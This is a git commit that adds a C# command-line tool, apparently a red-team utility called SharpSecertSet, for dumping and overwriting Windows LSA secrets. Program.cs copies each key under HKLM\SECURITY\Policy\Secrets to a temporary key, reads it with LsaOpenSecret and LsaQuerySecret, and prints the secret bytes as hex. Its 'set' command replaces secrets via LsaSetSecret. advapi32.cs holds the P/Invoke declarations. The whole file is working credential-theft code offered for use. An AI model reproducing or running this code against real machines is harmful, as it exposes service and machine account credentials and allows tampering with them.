52c2c9c4a8ff9abc2dc00fb060b2ce6aa3919920
unknown <michael.bielsy@gmail.com>
2021-03-28 22:48:58 +1100

    dump/set working

---
+++ Program.cs
@@ -0,0 +1,239 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using Microsoft.Win32;
+
+namespace SharpSecertSet
+{
+    class Program
+    {
+        static void PrintHelp()
+        {
+            Console.WriteLine("Usage: %s dump [key]", System.AppDomain.CurrentDomain.FriendlyName);
+            Console.WriteLine("Usage: %s set key value --base64", System.AppDomain.CurrentDomain.FriendlyName);
+        }
+
+        static void Main(string[] args)
+        {
+            if (args.Length < 1)
+            {
+                PrintHelp();
+            } 
+            else if (args[0] == "dump")
+            {
+                if (args.Length == 1)
+                {
+                    DumpSecretOrAll(null);
+                } 
+                else
+                {
+                    DumpSecretOrAll(args[1]);
+                }
+            }
+            else if (args[0] == "set")
+            {
+                if (args.Length == 3)
+                {
+                    WriteLSASecret(args[1], args[2]);
+                }
+                else if (args.Length == 4 && args[3] == "--base64")
+                {
+                    //update from base64 string
+                }
+                else
+                {
+                    PrintHelp();
+                }
+            }
+        }
+
+        public static string LSAUS2string(advapi32.LSA_UNICODE_STRING lsaus)
+        {
+            char[] cvt = new char[lsaus.Length / UnicodeEncoding.CharSize];
+            Marshal.Copy(lsaus.Buffer, cvt, 0, lsaus.Length / UnicodeEncoding.CharSize);
+            return new string(cvt);
+        }
+
+        public static string ByteArrayToString(byte[] ba)
+        {
+            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            foreach (byte b in ba)
+                hex.AppendFormat("{0:x2}", b);
+            return hex.ToString();
+        }
+
+        public static bool RenameSubKey(RegistryKey parentKey,
+            string subKeyName, string newSubKeyName)
+        {
+            CopyKey(parentKey, subKeyName, newSubKeyName);
+            parentKey.DeleteSubKeyTree(subKeyName);
+            return true;
+        }
+
+        public static bool CopyKey(RegistryKey parentKey,
+            string keyNameToCopy, string newKeyName)
+        {
+            //Create new key
+            RegistryKey destinationKey = parentKey.CreateSubKey(newKeyName);
+
+            //Open the sourceKey we are copying from
+            RegistryKey sourceKey = parentKey.OpenSubKey(keyNameToCopy);
+
+            RecurseCopyKey(sourceKey, destinationKey);
+
+            return true;
+        }
+
+        private static void RecurseCopyKey(RegistryKey sourceKey, RegistryKey destinationKey)
+        {
+            //copy all the values
+            foreach (string valueName in sourceKey.GetValueNames())
+            {
+                object objValue = sourceKey.GetValue(valueName);
+                RegistryValueKind valKind = sourceKey.GetValueKind(valueName);
+                destinationKey.SetValue(valueName, objValue, valKind);
+            }
+
+            //For Each subKey 
+            //Create a new subKey in destinationKey 
+            //Call myself 
+            foreach (string sourceSubKeyName in sourceKey.GetSubKeyNames())
+            {
+                RegistryKey sourceSubKey = sourceKey.OpenSubKey(sourceSubKeyName);
+                RegistryKey destSubKey = destinationKey.CreateSubKey(sourceSubKeyName);
+                RecurseCopyKey(sourceSubKey, destSubKey);
+            }
+        }
+
+        static void DumpSecretOrAll(string target)
+        {
+            var Secrets = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets", true);
+            foreach (var key in Secrets.GetSubKeyNames())
+            {
+                if (string.IsNullOrWhiteSpace(target) || key == target) {
+                    const string newKeyName = "TempSecret";
+                    CopyKey(Secrets, key, newKeyName);
+                    var secret = ReadLSASecret(newKeyName);
+                    Console.WriteLine("{0}: {1}", key, ByteArrayToString(secret));
+                    Secrets.DeleteSubKeyTree(newKeyName);
+                }
+            }
+        }
+
+        static void PopulateLsaUnicodeString(string s, ref advapi32.LSA_UNICODE_STRING lus)
+        {
+            lus.Buffer = Marshal.StringToHGlobalUni(s);
+            lus.Length = (UInt16)(s.Length * UnicodeEncoding.CharSize);
+            lus.MaximumLength = (UInt16)((s.Length + 1) * UnicodeEncoding.CharSize);
+        }
+
+        static byte[] ReadLSASecret(string key)
+        {
+            var lsaPolicyHandle = GetPolicyHandle();
+
+            var secretName = new advapi32.LSA_UNICODE_STRING();
+            PopulateLsaUnicodeString(key, ref secretName);
+
+            var secretHandle = IntPtr.Zero;
+            var ntsResult = advapi32.LsaOpenSecret(lsaPolicyHandle, ref secretName, (uint)advapi32.LSA_SecretAccess.SECRET_QUERY_VALUE, out secretHandle);
+            var lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
+            if (lsaNtStatusToWinError != 0)
+            {
+                throw new Exception(String.Format("LsaOpenSecret Error: {0}", lsaNtStatusToWinError));
+            }
+
+            IntPtr secretValue = IntPtr.Zero;
+            ntsResult = advapi32.LsaQuerySecret(secretHandle, out secretValue, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            if (ntsResult != 0)
+            {
+                throw new Exception(String.Format("LsaQuerySecret Error: {0}", ntsResult));
+            }
+
+            var currentData = (advapi32.LSA_UNICODE_STRING)Marshal.PtrToStructure(secretValue, typeof(advapi32.LSA_UNICODE_STRING));
+
+            var SecretData = new byte[currentData.Length];
+            Marshal.Copy(currentData.Buffer, SecretData, 0, SecretData.Length);
+            advapi32.LsaClose(lsaPolicyHandle);
+            return SecretData;
+        }
+
+        static void dumpOLD(string key)
+        {
+            var lsaPolicyHandle = GetPolicyHandle();
+
+            //Secret Name
+            var secretName = new advapi32.LSA_UNICODE_STRING();
+            secretName.Buffer = Marshal.StringToHGlobalUni(key);
+            secretName.Length = (UInt16)(key.Length * UnicodeEncoding.CharSize);
+            secretName.MaximumLength = (UInt16)((key.Length + 1) * UnicodeEncoding.CharSize);
+
+            // Retrieve Private Data
+            var privateData = IntPtr.Zero;
+            var ntsResult = advapi32.LsaRetrievePrivateData(lsaPolicyHandle, ref secretName, out privateData);
+            var lsaClose = advapi32.LsaClose(lsaPolicyHandle);
+
+            var lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
+            if (lsaNtStatusToWinError != 0)
+            {
+                Console.WriteLine("LsaRetrievePrivateData error: {0}", lsaNtStatusToWinError);
+                return;
+            }
+
+            var lusSecretData = (advapi32.LSA_UNICODE_STRING)Marshal.PtrToStructure(privateData, typeof(advapi32.LSA_UNICODE_STRING));
+            var value = Marshal.PtrToStringAuto(lusSecretData.Buffer);
+            //value = value.Substring(0, lusSecretData.Length / 2);
+
+
+
+            //var SecretData = new byte[lusSecretData.Length];
+            //Marshal.Copy(lusSecretData.Buffer, SecretData, 0, SecretData.Length);
+
+
+            //Console.WriteLine("Newnew {0}: {1}", key, value);
+            //Console.WriteLine("{0}: {1}", key, LSAUS2string(lusSecretData));
+        }
+
+        static IntPtr GetPolicyHandle()
+        {
+            var objectAttributes = new advapi32.LSA_OBJECT_ATTRIBUTES();
+            var localsystem = new advapi32.LSA_UNICODE_STRING();
+            var lsaPolicyHandle = IntPtr.Zero;
+
+            var lsaOpenPolicyHandle = advapi32.LsaOpenPolicy(ref localsystem, ref objectAttributes,
+                (uint)advapi32.LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION, out lsaPolicyHandle);
+            if (lsaOpenPolicyHandle != 0)
+            {
+                Console.WriteLine("LsaOpenPolicy Error: {0}", lsaOpenPolicyHandle);
+                System.Environment.Exit(1);
+            }
+            return lsaPolicyHandle;
+        }
+
+        static void WriteLSASecret(string key, string value)
+        {
+            var lsaPolicyHandle = GetPolicyHandle();
+
+            var secretName = new advapi32.LSA_UNICODE_STRING();
+            PopulateLsaUnicodeString(key, ref secretName);
+            var secretNewValue = new advapi32.LSA_UNICODE_STRING();
+            PopulateLsaUnicodeString(value, ref secretNewValue);
+
+            var secretHandle = IntPtr.Zero;
+            var ntsResult = advapi32.LsaOpenSecret(lsaPolicyHandle, ref secretName, 1, out secretHandle);
+            var lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
+            if (lsaNtStatusToWinError != 0)
+            {
+                Console.WriteLine("LsaOpenSecret Error: {0}", lsaNtStatusToWinError);
+            }
+
+            ntsResult = advapi32.LsaSetSecret(secretHandle, ref secretNewValue, ref secretNewValue);
+            lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
+            if (lsaNtStatusToWinError != 0)
+            {
+                Console.WriteLine("LsaSetSecret Error: {0}", lsaNtStatusToWinError);
+            }
+
+            advapi32.LsaClose(lsaPolicyHandle);
+        }
+    }
+}
---
+++ advapi32.cs
@@ -0,0 +1,95 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace SharpSecertSet
+{
+    internal class advapi32
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LSA_UNICODE_STRING
+        {
+            public UInt16 Length;
+            public UInt16 MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LSA_OBJECT_ATTRIBUTES
+        {
+            public int Length;
+            public IntPtr RootDirectory;
+            public LSA_UNICODE_STRING ObjectName;
+            public uint Attributes;
+            public IntPtr SecurityDescriptor;
+            public IntPtr SecurityQualityOfService;
+        }
+        public enum LSA_AccessPolicy : long
+        {
+            POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
+            POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
+            POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
+            POLICY_TRUST_ADMIN = 0x00000008L,
+            POLICY_CREATE_ACCOUNT = 0x00000010L,
+            POLICY_CREATE_SECRET = 0x00000020L,
+            POLICY_CREATE_PRIVILEGE = 0x00000040L,
+            POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
+            POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
+            POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
+            POLICY_SERVER_ADMIN = 0x00000400L,
+            POLICY_LOOKUP_NAMES = 0x00000800L,
+            POLICY_NOTIFICATION = 0x00001000L
+        }
+
+        public enum LSA_SecretAccess : long
+        {
+            SECRET_SET_VALUE = 0x00000001L,
+            SECRET_QUERY_VALUE = 0x00000002L
+        }
+
+        [DllImport("advapi32.dll")]
+        public static extern uint LsaSetSecret(
+            [In] IntPtr SecretHandle,
+            [In][Optional] ref LSA_UNICODE_STRING CurrentValue,
+            [In][Optional] ref LSA_UNICODE_STRING OldValue
+        );
+        [DllImport("advapi32.dll")]
+        public static extern uint LsaOpenSecret(
+            [In] IntPtr PolicyHandle,
+            [In] ref LSA_UNICODE_STRING SecretName,
+            [In] uint DesiredAccess,
+            [Out] out IntPtr SecretHandle
+        );
+        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+        public static extern uint LsaOpenPolicy(
+          ref LSA_UNICODE_STRING SystemName,
+          ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
+          uint DesiredAccess,
+          out IntPtr PolicyHandle
+        );
+
+        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+        public static extern uint LsaRetrievePrivateData(
+          IntPtr PolicyHandle,
+          ref LSA_UNICODE_STRING KeyName,
+          out IntPtr PrivateData
+        );
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern uint LsaQuerySecret(
+            IntPtr secretHandle,
+            out IntPtr currentValue,
+            IntPtr currentValueSetTime,
+            IntPtr oldValue,
+            IntPtr oldValueSetTime
+        );
+
+        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+        public static extern uint LsaNtStatusToWinError(
+          uint status
+        );
+        [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+        public static extern uint LsaClose(
+          IntPtr policyHandle
+        );
+    }
+}
